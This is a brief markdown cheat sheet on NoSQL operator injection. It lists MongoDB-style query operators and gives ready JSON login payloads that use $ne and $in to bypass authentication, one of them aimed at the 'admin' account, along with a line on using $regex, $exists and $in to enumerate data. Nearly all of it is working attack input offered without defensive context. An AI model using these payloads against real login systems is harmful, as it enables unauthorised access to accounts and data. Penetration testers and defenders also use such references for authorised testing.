# Operator Injection

## Common Operators

$ne

$gt

$lt

$in

$regex

$where

---

## Authentication Bypass

{
  "username":{"$ne":"invalid"},
  "password":{"$ne":"invalid"}
}

---

## Targeted Login

{
  "username":{"$in":["admin"]},
  "password":{"$ne":""}
}

---

## Enumeration

Use:

$regex

$exists

$in

To discover data and field behavior.